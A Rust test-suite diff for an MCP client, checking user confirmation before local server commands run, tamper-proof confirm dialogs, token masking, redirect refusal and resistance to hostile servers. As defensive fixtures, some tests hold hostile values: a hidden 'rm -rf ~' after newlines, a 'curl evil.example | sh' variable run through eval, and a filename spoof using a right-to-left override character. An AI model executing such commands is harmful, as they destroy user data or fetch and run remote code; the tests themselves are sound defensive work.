+    /// 允许过的指纹不再问;命令 / 参数 / 环境任一改动 ⇒ 重新问;允许记录落盘、换进程照认;http 规格不问
+    #[test]
+    fn stdio_spawn_requires_confirmation_and_rechecks_on_change() {
+        let dir = std::env::temp_dir().join(format!(
+            "horosa-mcpapprove-{}-{}",
+            std::process::id(),
+            line!()
+        ));
+        let _ = std::fs::create_dir_all(&dir);
+        let mark = dir.join("spawned.mark");
+        let spec = stdio_spec(
+            "s",
+            "/bin/sh",
+            vec!["-c".into(), format!("touch '{}'; exec cat", mark.display())],
+            1500,
+        );
+        // ① 没有确认器(缺省)= 一律不起
+        let bare = ClientState::default();
+        bare.upsert(spec.clone()).unwrap();
+        let e = bare.connect("s").expect_err("未经确认必须拒");
+        assert!(format!("{e:#}").contains("未经确认"), "{e:#}");
+        thread::sleep(Duration::from_millis(150));
+        assert!(!mark.exists(), "拒绝时不得 spawn");
+        // ② 确认器拒 → 不起;确认器看到的是完整命令行
+        let seen = Arc::new(Mutex::new(Vec::<String>::new()));
+        let seen2 = seen.clone();
+        let deny = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, d: &str| {
+            seen2.lock().unwrap().push(d.to_string());
+            false
+        }));
+        deny.bind_dir(&dir);
+        deny.upsert(spec.clone()).unwrap();
+        assert!(deny.connect("s").is_err());
+        thread::sleep(Duration::from_millis(150));
+        assert!(!mark.exists(), "用户拒绝时不得 spawn");
+        assert!(
+            seen.lock().unwrap()[0].contains("/bin/sh -c"),
+            "{:?}",
+            seen.lock().unwrap()
+        );
+        // ③ 允许一次 → 起;同一条再连不再问
+        let asks = Arc::new(AtomicU64::new(0));
+        let asks2 = asks.clone();
+        let allow = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, _d: &str| {
+            asks2.fetch_add(1, Ordering::SeqCst);
+            true
+        }));
+        allow.bind_dir(&dir);
+        allow.upsert(spec.clone()).unwrap();
+        let _ = allow.connect("s"); // cat 不是 MCP 服务器:握手会超时报错,但进程已按允许起来
+        assert!(mark.exists(), "允许后应 spawn");
+        let _ = allow.connect("s");
+        assert_eq!(asks.load(Ordering::SeqCst), 1, "同一条命令只问一次");
+        allow.disconnect("s");
+        // ④ 允许记录落盘:换一个进程(新 state)照认,不再问也能起
+        let _ = std::fs::remove_file(&mark);
+        let reload = ClientState::with_stdio_confirm(Arc::new(|_n: &str, _d: &str| false));
+        reload.bind_dir(&dir);
+        let _ = reload.connect("s");
+        assert!(mark.exists(), "已允许过的命令换进程照认");
+        reload.disconnect("s");
+        // ⑤ 页面改了参数(一次 IPC)→ 指纹变 → 重新问,拒了就不起
+        let _ = std::fs::remove_file(&mark);
+        let mut changed = spec.clone();
+        if let Transport::Stdio { args, .. } = &mut changed.transport {
+            args.push("--extra".into());
+        }
+        reload.upsert(changed).unwrap();
+        assert!(reload.connect("s").is_err());
+        thread::sleep(Duration::from_millis(150));
+        assert!(!mark.exists(), "改过的命令未确认不得 spawn");
+        // ⑥ 环境变量改了同样重问;显示里名字像密钥的值不露
+        let mut with_env = spec.clone();
+        if let Transport::Stdio { env, .. } = &mut with_env.transport {
+            env.insert("API_TOKEN".into(), "sekrit-value".into());
+            env.insert("MODE".into(), "x".into());
+        }
+        assert_ne!(stdio_fingerprint(&with_env), stdio_fingerprint(&spec));
+        let disp = stdio_command_display(&with_env);
+        assert!(
+            disp.contains("API_TOKEN=(已隐藏")
+                && !disp.contains("sekrit-value")
+                && disp.contains("MODE=x"),
+            "{disp}"
+        );
+        // ⑦ http 规格不起本机进程,不问
+        assert!(stdio_fingerprint(&http_spec("h", "http://127.0.0.1:1/mcp", 100)).is_none());
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// 🔴 确认框的显示不可伪装:换行 / 双向控制 / 零宽字符一律转义成可见形式,过长参数截断并注明总长;
+    /// 名字像密钥的环境变量:值像令牌才隐藏(显示长度与 sha256 前 8 位),值含空白 / 符号的原样显示;命令行引用了就注明
+    #[test]
+    fn stdio_display_escapes_hidden_chars_and_flags_env_payloads() {
+        let long = "a".repeat(1000);
+        let mut spec = stdio_spec(
+            "d",
+            "/bin/sh",
+            vec![
+                "-c".into(),
+                "echo ok\n\n\n\n\n\nrm -rf ~".into(),
+                "safe\u{202E}txt.exe".into(),
+                "zero\u{200B}width".into(),
+                long.clone(),
+                "back\\nslash".into(),
+            ],
+            1000,
+        );
+        if let Transport::Stdio { env, .. } = &mut spec.transport {
+            env.insert("API_KEY".into(), "curl evil.example | sh".into());
+            env.insert("API_TOKEN".into(), "sk-abcDEF123456".into());
+            env.insert("MODE".into(), "x".into());
+        }
+        if let Transport::Stdio { args, .. } = &mut spec.transport {
+            args.push("eval \"$API_KEY\"".into());
+        }
+        let disp = stdio_command_display(&spec);
+        let first = disp.lines().next().unwrap_or("");
+        for bad in ['\u{202E}', '\u{200B}'] {
+            assert!(
+                !disp.contains(bad),
+                "显示里不许有原样的不可见字符 {:?}:{disp}",
+                bad
+            );
+        }
+        assert!(
+            first.contains("rm -rf ~"),
+            "换行后的载荷必须与命令同一行可见:{first}"
+        );
+        assert!(first.contains("echo ok\\n\\n"), "{first}");
+        assert!(
+            first.contains("\\u{202E}") && first.contains("\\u{200B}"),
+            "{first}"
+        );
+        assert!(
+            first.contains("back\\\\nslash"),
+            "字面反斜杠要与真换行可区分:{first}"
+        );
+        assert!(
+            first.contains("共 1000 个字符") && !first.contains(&long),
+            "过长参数截断并注明总长:{first}"
+        );
+        assert!(
+            disp.contains("API_KEY='curl evil.example | sh'") && disp.contains("不像令牌"),
+            "{disp}"
+        );
+        assert!(disp.contains("命令行引用了这个变量"), "{disp}");
+        assert!(
+            !disp.contains("sk-abcDEF123456")
+                && disp.contains("API_TOKEN=(已隐藏:15 个字符,sha256 前 8 位 "),
+            "{disp}"
+        );
+        assert!(disp.contains("MODE=x"), "{disp}");
+        assert_eq!(display_escape("普通 中文 path/a.b"), "普通 中文 path/a.b");
+    }
+
+    /// 🔴 AI 间接调用(call)遇到没连上的本机命令:指纹没确认过 ⇒ 直接报错、不弹确认框、不 spawn;
+    /// 用户在面板点「连接」才弹;确认过之后,掉线后的 AI 调用可以静默重连(不再问)
+    #[test]
+    fn ai_call_never_prompts_for_unapproved_stdio() {
+        let _guard = env_guard();
+        let dir = std::env::temp_dir().join(format!(
+            "horosa-mcpnoprompt-{}-{}",
+            std::process::id(),
+            line!()
+        ));
+        let _ = std::fs::create_dir_all(&dir);
+        let mark = dir.join("spawned.mark");
+        let _ = std::fs::remove_file(&mark);
+        let asks = Arc::new(AtomicU64::new(0));
+        let asks2 = asks.clone();
+        let state = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, _d: &str| {
+            asks2.fetch_add(1, Ordering::SeqCst);
+            true
+        }));
+        let spec = stdio_spec(
+            "np",
+            "/bin/sh",
+            vec!["-c".into(), format!("touch '{}'; exec cat", mark.display())],
+            600,
+        );
+        state.upsert(spec).unwrap();
+        let e = state
+            .call("np", "get_time", json!({}))
+            .expect_err("未确认的命令不许由 AI 调用拉起");
+        assert!(format!("{e:#}").contains("面板"), "{e:#}");
+        thread::sleep(Duration::from_millis(150));
+        assert_eq!(asks.load(Ordering::SeqCst), 0, "AI 调用不得弹确认框");
+        assert!(!mark.exists(), "AI 调用不得 spawn 未确认的命令");
+        let _ = state.connect("np"); // 用户点连接:弹一次(cat 不是 MCP 服务器,握手超时,但指纹已确认)
+        assert_eq!(asks.load(Ordering::SeqCst), 1);
+        assert!(mark.exists());
+        state.disconnect("np"); // 模拟掉线
+        thread::sleep(Duration::from_millis(100));
+        let _ = std::fs::remove_file(&mark);
+        let _ = state.call("np", "get_time", json!({})); // 确认过:AI 调用可以重连,不再问
+        assert_eq!(asks.load(Ordering::SeqCst), 1, "确认过的命令重连不再问");
+        assert!(mark.exists(), "确认过的命令允许自动重连");
+        state.disconnect("np");
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// 🔴 upsert 改了命令 / 参数 / 环境:旧连接立刻断开(回包 disconnected=true),之后的 AI 调用不会连到没确认过的新命令;
+    /// 只改超时等非传输字段不断开
+    #[test]
+    fn upsert_changing_command_disconnects_old_connection() {
+        let _guard = env_guard();
+        let script = stdio_script(&[
+            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
+            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"up\"}}"),
+            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
+            ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"ok\"}],\"isError\":false}"),
+        ]);
+        let asks = Arc::new(AtomicU64::new(0));
+        let asks2 = asks.clone();
+        let state = ClientState::with_stdio_confirm(Arc::new(move |_n: &str, _d: &str| {
+            asks2.fetch_add(1, Ordering::SeqCst);
+            true
+        }));
+        let spec = stdio_spec("up", "/bin/sh", vec!["-c".into(), script], 3000);
+        state.upsert(spec.clone()).unwrap();
+        state.connect("up").expect("连上假 stdio 服务");
+        assert_eq!(state.list()[0]["connected"], true);
+        let mut slower = spec.clone();
+        slower.timeout_ms = 4000;
+        let out = state.upsert(slower.clone()).unwrap();
+        assert_eq!(out["disconnected"], false, "只改超时不断开");
+        assert_eq!(state.list()[0]["connected"], true);
+        let mut changed = slower.clone();
+        if let Transport::Stdio { args, .. } = &mut changed.transport {
+            args.push("--changed".into());
+        }
+        let out = state.upsert(changed).unwrap();
+        assert_eq!(out["disconnected"], true, "改了命令必须断开旧连接");
+        assert_eq!(state.list()[0]["connected"], false);
+        assert!(state.conns.lock().unwrap().get("up").is_none());
+        let e = state
+            .call("up", "get_time", json!({}))
+            .expect_err("改过的命令没确认,AI 调用不许连");
+        assert!(format!("{e:#}").contains("面板"), "{e:#}");
+        assert_eq!(asks.load(Ordering::SeqCst), 1, "只有用户点连接那一次问过");
+    }
+
     fn stdio_spec(id: &str, command: &str, args: Vec<String>, timeout_ms: u64) -> ServerSpec {
         ServerSpec {
             id: id.into(),
@@ -1094,7 +1825,7 @@ mod tests {
         }
     }
 
-    /// [I13 夹具] 假服务器的回体形态。
+    /// 假服务器的回体形态。
     #[derive(Clone, Copy)]
     enum BodyPlan {
         /// 一条正常的小 JSON-RPC 回体(id 恒 1)
@@ -1105,7 +1836,7 @@ mod tests {
         HalfClosed { bytes: usize },
     }
 
-    /// [I13 夹具] 敌意 HTTP 服务器(裸 `TcpListener`,不经任何 HTTP 库):
+    /// 敌意 HTTP 服务器(裸 `TcpListener`,不经任何 HTTP 库):
     /// 可以延迟发头、可以发超大体、可以半关闭。回 base url;监听线程随进程结束。
     fn slow_http_server(delay_ms: u64, body: BodyPlan) -> String {
         let listener = TcpListener::bind("127.0.0.1:0").expect("bind 127.0.0.1:0");
@@ -1185,7 +1916,7 @@ mod tests {
         }
     }
 
-    /// [I13 夹具] 挂死子进程:`/bin/sleep 30` —— stdin 收得下(管道缓冲),但永远不回一个字节。
+    /// 挂死子进程:`/bin/sleep 30` —— stdin 收得下(管道缓冲),但永远不回一个字节。
     fn hung_child(timeout_ms: u64) -> Conn {
         open_conn(&stdio_spec(
             "hung",
@@ -1196,7 +1927,7 @@ mod tests {
         .expect("应能起挂死子进程")
     }
 
-    /// [I13 夹具] 超长行 stdio 子进程:一口气吐 3MB 且**不带换行**,专打「整行缓冲」。
+    /// 超长行 stdio 子进程:一口气吐 3MB 且**不带换行**,专打「整行缓冲」。
     fn giant_line_spec(id: &str, timeout_ms: u64) -> ServerSpec {
         stdio_spec(
             id,
@@ -1209,7 +1940,7 @@ mod tests {
         )
     }
 
-    // ───────────────────── [L1·阶段 2] 敌意外部 MCP 服务器 ─────────────────────
+    // ───────────────────── 敌意外部 MCP 服务器 ─────────────────────
 
     /// 🔴 先红:HTTP 回体是**先全读、后判上限**。
     ///
@@ -1223,7 +1954,7 @@ mod tests {
     fn http_response_over_cap_rejected_streaming() {
         let _guard = env_guard();
         let url = slow_http_server(0, BodyPlan::StalledOversize { bytes: 5 << 20 });
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(http_spec("cap", &url, 2000))
             .expect("登记服务器");
@@ -1249,7 +1980,7 @@ mod tests {
     fn http_slow_headers_time_out() {
         let _guard = env_guard();
         let url = slow_http_server(3000, BodyPlan::SmallJson);
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(http_spec("slow", &url, 1000))
             .expect("登记服务器");
@@ -1270,7 +2001,7 @@ mod tests {
     fn http_half_closed_body_errors_fast() {
         let _guard = env_guard();
         let url = slow_http_server(0, BodyPlan::HalfClosed { bytes: 4096 });
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(http_spec("half", &url, 3000))
             .expect("登记服务器");
@@ -1296,10 +2027,12 @@ mod tests {
     #[test]
     fn stdio_giant_line_bounded() {
         let _guard = env_guard();
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(giant_line_spec("giant", 1500))
             .expect("登记服务器");
+        // 用户先在面板点过一次「连接」(确认指纹;握手本身同样因超长行失败)
+        let _ = state.connect("giant");
         let t0 = Instant::now();
         let err = state
             .call("giant", "anything", json!({}))
@@ -1340,13 +2073,23 @@ mod tests {
             cost
         );
         assert!(
-            child.try_wait().expect("try_wait").is_none(),
+            child
+                .lock()
+                .unwrap()
+                .try_wait()
+                .expect("try_wait")
+                .is_none(),
             "超时本身不杀进程(收尸交给 disconnect)"
         );
-        let _ = child.kill();
-        let _ = child.wait();
+        kill_child(child);
+        let _ = child.lock().unwrap().wait();
         assert!(
-            child.try_wait().expect("try_wait").is_some(),
+            child
+                .lock()
+                .unwrap()
+                .try_wait()
+                .expect("try_wait")
+                .is_some(),
             "kill + wait 之后子进程必须已退出"
         );
 
@@ -1357,7 +2100,7 @@ mod tests {
             ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
             ("*'\"method\":\"tools/call\"'*", ":"),
         ]);
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(stdio_spec(
                 "mute",
@@ -1511,16 +2254,16 @@ mod tests {
         let _guard = env_guard();
         std::env::set_var(MCP_CLIENT_KILL_ENV, "0");
         assert!(!client_allowed());
-        let state = ClientState::default();
+        let state = test_state();
         assert!(state.connect("nope").is_err());
         std::env::remove_var(MCP_CLIENT_KILL_ENV);
         assert!(client_allowed());
     }
 
-    /// [Q-294/M-109·AR-24] 编辑令牌留空 = 保留旧令牌:keep_headers 只在「来稿 headers 空 且 旧稿有」时沿用;来稿带新令牌则替换;普通 upsert 照旧清空
+    /// 编辑令牌留空 = 保留旧令牌:keep_headers 只在「来稿 headers 空 且 旧稿有」时沿用;来稿带新令牌则替换;普通 upsert 照旧清空
     #[test]
     fn upsert_keeping_preserves_old_headers_only_when_asked() {
-        let state = ClientState::default();
+        let state = test_state();
         let mut headers = HashMap::new();
         headers.insert("Authorization".to_string(), "Bearer old".to_string());
         let mut spec = http_spec("k", "https://example.test/mcp", 2000);
@@ -1578,7 +2321,7 @@ mod tests {
         let dir = std::env::temp_dir().join(format!("horosa-mcpclient-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&dir);
         std::fs::create_dir_all(&dir).unwrap();
-        let state = ClientState::default();
+        let state = test_state();
         state.bind_dir(&dir);
         let mut headers = HashMap::new();
         headers.insert("Authorization".to_string(), "Bearer t".to_string());
@@ -1613,7 +2356,7 @@ mod tests {
         assert!(!listed[0].to_string().contains("Bearer t"));
         assert_eq!(listed[0]["connected"], false);
         // 重新载入 = 同一份(令牌留在盘上,只是不回页面)
-        let state2 = ClientState::default();
+        let state2 = test_state();
         state2.bind_dir(&dir);
         assert_eq!(state2.list().len(), 1);
         assert!(state2.remove("s1").unwrap());
@@ -1631,7 +2374,7 @@ mod tests {
             ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"description\":\"d\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
             ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"12:00\"}],\"isError\":false}"),
         ]);
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(ServerSpec {
                 id: "t".into(),
@@ -1767,7 +2510,7 @@ mod tests {
     fn http_probe_modern_server_uses_per_request_meta_and_headers() {
         let _guard = env_guard();
         let (url, h) = era_http_server("modern");
-        let state = ClientState::default();
+        let state = test_state();
         state.upsert(http_spec("m", &url, 3000)).unwrap();
         let out = state.connect("m").expect("现代服务器应连上");
         assert_eq!(out["era"], "modern");
@@ -1810,7 +2553,7 @@ mod tests {
     fn http_probe_legacy_server_falls_back_to_initialize() {
         let _guard = env_guard();
         let (url, h) = era_http_server("legacy");
-        let state = ClientState::default();
+        let state = test_state();
         state.upsert(http_spec("l", &url, 3000)).unwrap();
         let out = state.connect("l").expect("旧服务器应回退连上");
         assert_eq!(out["era"], "legacy");
@@ -1843,7 +2586,7 @@ mod tests {
     fn http_probe_modern_error_minus_32022_does_not_fall_back() {
         let _guard = env_guard();
         let (url, h) = era_http_server("modern32022");
-        let state = ClientState::default();
+        let state = test_state();
         state.upsert(http_spec("v", &url, 3000)).unwrap();
         let err = state.connect("v").expect_err("无共同版本必须报错");
         assert!(err.to_string().contains("protocol version"), "{err}");
@@ -1903,7 +2646,7 @@ mod tests {
             ("*'\"method\":\"tools/list\"'*", "\"error\":{\"code\":-32602,\"message\":\"missing _meta\"}"),
             ("*'\"method\":\"tools/call\"'*'\"_meta\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"modern-stdio 12:00\"}],\"isError\":false}"),
         ]);
-        let state = ClientState::default();
+        let state = test_state();
         state
             .upsert(stdio_spec("ms", "/bin/sh", vec!["-c".into(), modern], 3000))
             .unwrap();
@@ -1959,7 +2702,7 @@ mod tests {
     fn modern_input_required_result_is_rejected() {
         let _guard = env_guard();
         let (url, h) = era_http_server("input_required");
-        let state = ClientState::default();
+        let state = test_state();
         state.upsert(http_spec("ir", &url, 3000)).unwrap();
         let err = state.connect("ir").expect_err("input_required 必须拒收");
         assert!(err.to_string().contains("input_required"), "{err}");
@@ -1968,7 +2711,7 @@ mod tests {
     }
 
     /// 🟢 壳侧准入镜像页面规则:未宣告 ⇒ not listed;既非 readOnlyHint 又不在允许清单 ⇒ not admitted;
-    /// [Q-292] 只读档下允许清单不放行写工具;按清单档列入允许清单后放行。
+    /// 只读档下允许清单不放行写工具;按清单档列入允许清单后放行。
     #[test]
     fn call_admission_mirrors_page_rule() {
         let _guard = env_guard();
@@ -1978,9 +2721,10 @@ mod tests {
             ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}},{\"name\":\"write_note\",\"inputSchema\":{\"type\":\"object\"}}]}"),
             ("*'\"method\":\"tools/call\"'*", "\"result\":{\"content\":[{\"type\":\"text\",\"text\":\"ok\"}],\"isError\":false}"),
         ]);
-        let state = ClientState::default();
+        let state = test_state();
         let mut spec = stdio_spec("adm", "/bin/sh", vec!["-c".into(), script], 3000);
         state.upsert(spec.clone()).unwrap();
+        state.connect("adm").expect("用户在面板点连接(确认过指纹)");
         assert_eq!(
             state.call("adm", "get_time", json!({})).unwrap()["content"][0]["text"],
             "ok",
@@ -2034,11 +2778,282 @@ mod tests {
         assert!(admit_tool(&base, &tools, "zz").is_err());
         let mut listed = base.clone();
         listed.allow_tools = vec!["rw".into()];
-        // [Q-292] 只读档:清单不放行写工具;按清单档:清单放行
+        // 只读档:清单不放行写工具;按清单档:清单放行
         assert!(admit_tool(&listed, &tools, "rw").is_err());
         listed.read_only_only = false;
         assert!(admit_tool(&listed, &tools, "rw").is_ok());
         assert!(admit_tool(&listed, &tools, "ro").is_ok());
         assert!(state.disconnect("adm"));
+    }
+
+    // ───────────────────── 断开不等在途调用 / stdin 写有截止 / 不跟随重定向 ─────────────────────
+
+    fn mute_call_script() -> String {
+        stdio_script(&[
+            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
+            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"mute\"}}"),
+            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[{\"name\":\"get_time\",\"inputSchema\":{\"type\":\"object\"},\"annotations\":{\"readOnlyHint\":true}}]}"),
+            ("*'\"method\":\"tools/call\"'*", ":"),
+        ])
+    }
+
+    fn with_header(mut spec: ServerSpec, k: &str, v: &str) -> ServerSpec {
+        if let Transport::Http { headers, .. } = &mut spec.transport {
+            headers.insert(k.into(), v.into());
+        }
+        spec
+    }
+
+    /// 🔴 旧实现 `call` 在整个往返期间攥着连接锁,`disconnect` 先摘表再阻塞等这把锁 —— 在途调用最长 120 s,
+    /// 断开 / 删除(主线程命令)与退出臂就跟着卡住界面。现在断开先杀进程、不碰连接锁:立刻返回,在途调用随即报错返回。
+    /// 🔴 在途 connect 握手期间:改了命令 / 用户点断开 ⇒ 这条连接作废(回错误、连接表里没有、按旧命令起的进程被收掉);
+    /// 不受干扰时照常连上;两路同时首连同一服务器(AI 并行调用自动连)不互相判废
+    #[test]
+    fn inflight_connect_is_voided_when_spec_changes_or_user_disconnects() {
+        let _guard = env_guard();
+        let base = stdio_script(&[
+            ("*'\"method\":\"server/discover\"'*", "\"error\":{\"code\":-32601,\"message\":\"Method not found\"}"),
+            ("*'\"method\":\"initialize\"'*", "\"result\":{\"protocolVersion\":\"2025-06-18\",\"serverInfo\":{\"name\":\"slow\"}}"),
+            ("*'\"method\":\"tools/list\"'*", "\"result\":{\"tools\":[]}"),
+        ]);
+        let slow_arm = "*'\"method\":\"tools/list\"'*) echo";
+        assert!(base.contains(slow_arm), "脚本形状变了:{base}");
+        let script = base.replace(slow_arm, "*'\"method\":\"tools/list\"'*) sleep 1; echo");
+        let state = Arc::new(test_state());
+        state
+            .upsert(stdio_spec(
+                "slow",
+                "/bin/sh",
+                vec!["-c".into(), script.clone()],
+                5000,
+            ))
+            .unwrap();
+        let in_table = |st: &ClientState| st.conns.lock().unwrap().contains_key("slow");
+        // ① 握手中改了命令
+        let s2 = Arc::clone(&state);
+        let h = thread::spawn(move || s2.connect("slow"));
+        thread::sleep(Duration::from_millis(400));
+        let out = state
+            .upsert(stdio_spec(
+                "slow",
+                "/bin/sh",
+                vec!["-c".into(), format!("{script}\n# v2")],
+                5000,
+            ))
+            .unwrap();
+        assert_eq!(out["transportChanged"], true);
+        let r = h.join().unwrap();
+        assert!(
+            r.is_err(),
+            "握手期间改了命令,旧命令的连接不该落进连接表:{:?}",
+            r
+        );
+        assert!(!in_table(&state), "旧命令的连接进了连接表");
+        // ② 握手中用户点断开
+        let s3 = Arc::clone(&state);
+        let h = thread::spawn(move || s3.connect("slow"));
+        thread::sleep(Duration::from_millis(400));
+        assert!(!state.disconnect("slow"), "握手中表里本来就没有这条");
+        assert!(
+            h.join().unwrap().is_err(),
+            "用户断开了,握手完成后不该再连上"
+        );
+        assert!(!in_table(&state));
+        // ③ 判别力:不受干扰照常连上
+        assert!(state.connect("slow").is_ok());
+        assert!(in_table(&state));
+        // ④ 两路同时首连不互相判废
+        state.disconnect("slow");
+        let (a, b) = (Arc::clone(&state), Arc::clone(&state));
+        let ha = thread::spawn(move || a.connect_inner("slow", false));
+        let hb = thread::spawn(move || b.connect_inner("slow", false));
+        assert!(
+            ha.join().unwrap().is_ok() && hb.join().unwrap().is_ok(),
+            "两路同时首连不该互相判废"
+        );
+        assert!(in_table(&state));
+        state.disconnect("slow");
+    }
+
+    #[test]
+    fn disconnect_does_not_wait_for_an_inflight_call() {
+        let _guard = env_guard();
+        let state = Arc::new(test_state());
+        state
+            .upsert(stdio_spec(
+                "busy",
+                "/bin/sh",
+                vec!["-c".into(), mute_call_script()],
+                20_000,
+            ))
+            .expect("登记服务器");
+        state.connect("busy").expect("应能连上");
+        let s2 = Arc::clone(&state);
+        let call = thread::spawn(move || {
+            let t = Instant::now();
+            let r = s2.call("busy", "get_time", json!({}));
+            (r, t.elapsed())
+        });
+        thread::sleep(Duration::from_millis(300));
+        let t0 = Instant::now();
+        assert!(state.disconnect("busy"));
+        let cost = t0.elapsed();
+        assert!(
+            cost < Duration::from_millis(500),
+            "断开不得等在途调用放锁,实耗 {:?}",
+            cost
+        );
+        let (r, took) = call.join().unwrap();
+        assert!(r.is_err(), "进程被杀后在途调用必须报错返回");
+        assert!(
+            took < Duration::from_secs(5),
+            "在途调用应随进程退出即返回(不等 20 s 超时),实耗 {:?}",
+            took
+        );
+        assert_eq!(state.list()[0]["connected"], false);
+    }
+
+    /// 退出臂:摘表即返回(杀进程与回收在后台线程),子进程随后确实被杀掉、回收。
+    #[test]
+    fn stop_on_exit_returns_at_once_and_still_kills_children() {
+        let _guard = env_guard();
+        let state = test_state();
+        state
+            .upsert(stdio_spec(
+                "bye",
+                "/bin/sh",
+                vec!["-c".into(), mute_call_script()],
+                5_000,
+            ))
+            .expect("登记服务器");
+        state.connect("bye").expect("应能连上");
+        let pid = state
+            .conns
+            .lock()
+            .unwrap()
+            .get("bye")
+            .and_then(|e| e.child.as_ref().map(|c| c.lock().unwrap().id()))
+            .expect("stdio 连接带子进程句柄");
+        let t0 = Instant::now();
+        stop_on_exit(&state);
+        assert!(
+            t0.elapsed() < Duration::from_millis(100),
+            "退出臂不得在调用线程上等,实耗 {:?}",
+            t0.elapsed()
+        );
+        assert_eq!(state.list()[0]["connected"], false);
+        let deadline = Instant::now() + Duration::from_secs(3);
+        while crate::mcp_stdio::pid_alive(pid) && Instant::now() < deadline {
+            thread::sleep(Duration::from_millis(20));
+        }
+        assert!(!crate::mcp_stdio::pid_alive(pid), "子进程应被杀掉并回收");
+    }
+
+    /// 🔴 stdin 写入没有截止时间:对方不读 stdin(管道缓冲写满)时调用线程永久阻塞在写上。
+    /// 现在写在专用线程里,调用方按同一超时预算等回执;写了半行的连接作废(子进程被杀)。
+    #[test]
+    fn stdin_write_is_bounded_by_the_call_timeout() {
+        let _guard = env_guard();
+        let mut conn = hung_child(800);
+        let Conn::Stdio { child, stdin, rx } = &mut conn else {
+            panic!("夹具必须是 stdio 连接")
+        };
+        let big = "x".repeat(4 << 20);
+        let req =
+            json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": { "blob": big } });
+        let t0 = Instant::now();
+        let err = stdio_rpc(stdin, rx, child, &req, 1, Duration::from_millis(800))
+            .expect_err("写不进去必须按超时收口");
+        assert!(err.to_string().contains("timeout writing"), "{}", err);
+        assert!(
+            t0.elapsed() < Duration::from_secs(3),
+            "实耗 {:?}",
+            t0.elapsed()
+        );
+        let deadline = Instant::now() + Duration::from_secs(3);
+        while child_exited(child).is_none() && Instant::now() < deadline {
+            thread::sleep(Duration::from_millis(20));
+        }
+        assert!(
+            child_exited(child).is_some(),
+            "写坏分帧的连接应作废(子进程被杀)"
+        );
+    }
+
+    /// 🔴 reqwest 缺省跟随重定向:3xx 会把自定义头(常常就是令牌)原样带去别的主机。现在不跟随,3xx 按上游错误报出。
+    #[test]
+    fn http_redirect_is_not_followed_and_custom_headers_stay_home() {
+        let _guard = env_guard();
+        let b = tiny_http::Server::http("127.0.0.1:0").expect("bind");
+        let b_port = b.server_addr().to_ip().map(|a| a.port()).unwrap_or(0);
+        let hb = thread::spawn(move || {
+            let mut leaked = 0usize;
+            while let Ok(Some(req)) = b.recv_timeout(Duration::from_millis(1500)) {
+                if req.headers().iter().any(|h| h.field.equiv("X-Api-Key")) {
+                    leaked += 1;
+                }
+                let _ = req.respond(tiny_http::Response::from_string("{}"));
+            }
+            leaked
+        });
+        let a = tiny_http::Server::http("127.0.0.1:0").expect("bind");
+        let a_port = a.server_addr().to_ip().map(|a| a.port()).unwrap_or(0);
+        let ha = thread::spawn(move || {
+            let mut n = 0usize;
+            while let Ok(Some(req)) = a.recv_timeout(Duration::from_millis(1500)) {
+                n += 1;
+                let loc = format!("http://127.0.0.1:{}/mcp", b_port);
+                let _ = req.respond(tiny_http::Response::empty(307).with_header(
+                    tiny_http::Header::from_bytes(&b"Location"[..], loc.as_bytes()).unwrap(),
+                ));
+            }
+            n
+        });
+        let state = test_state();
+        state
+            .upsert(with_header(
+                http_spec("redir", &format!("http://127.0.0.1:{}/mcp", a_port), 2000),
+                "X-Api-Key",
+                "s3cret",
+            ))
+            .expect("登记服务器");
+        let err = state.connect("redir").expect_err("3xx 不是成功回应");
+        assert!(err.to_string().contains("307"), "{}", err);
+        assert!(ha.join().unwrap() >= 1);
+        assert_eq!(hb.join().unwrap(), 0, "自定义头不得被重定向带去别的主机");
+    }
+
+    /// 带自定义头的明文 http 只许发往本机回环;发往别的机器在任何网络往来之前就拒连(提示改用 https)。
+    #[test]
+    fn plain_http_to_a_remote_host_with_custom_headers_is_refused() {
+        let _guard = env_guard();
+        let state = test_state();
+        state
+            .upsert(with_header(
+                http_spec("remote", "http://example.invalid/mcp", 2000),
+                "Authorization",
+                "Bearer s3cret",
+            ))
+            .expect("登记服务器");
+        let t0 = Instant::now();
+        let err = state.connect("remote").expect_err("必须拒连");
+        assert!(err.to_string().contains("https://"), "{}", err);
+        assert!(t0.elapsed() < Duration::from_millis(500));
+        // https / 本机回环 / 不带头的明文都不在此拒(只建客户端,不发请求)
+        for (url, header) in [
+            ("https://example.invalid/mcp", true),
+            ("http://127.0.0.1:9/mcp", true),
